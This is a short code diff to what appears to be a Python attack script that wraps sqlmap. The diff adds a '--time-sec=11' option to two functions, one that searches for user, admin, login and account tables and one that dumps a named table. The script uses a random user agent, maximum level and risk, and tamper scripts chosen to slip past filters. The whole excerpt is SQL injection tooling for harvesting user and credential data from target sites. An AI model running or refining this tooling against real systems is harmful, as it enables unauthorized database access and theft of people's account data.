@@ -113,6 +113,7 @@ def find_all_user_tables(sqlmap_path, exploit_path, vuln_params):
         "--random-agent",
         "--level=5",
         "--risk=3",
+        "--time-sec=11",
         "--tamper=space2comment,between,charencode",
         "--sql-query=SELECT TABLE_NAME FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND (TABLE_NAME LIKE '%user%' OR TABLE_NAME LIKE '%admin%' OR TABLE_NAME LIKE '%member%' OR TABLE_NAME LIKE '%login%' OR TABLE_NAME LIKE '%account%' OR TABLE_NAME LIKE '%profile%')",
     ]
@@ -185,6 +186,7 @@ def dump_users_from_table(sqlmap_path, exploit_path, vuln_params, table_name):
         "--random-agent",
         "--level=5",
         "--risk=3",
+        "--time-sec=11",
         "--tamper=space2comment,between,charencode",
         "--dump",
         f"-T {table_name}",
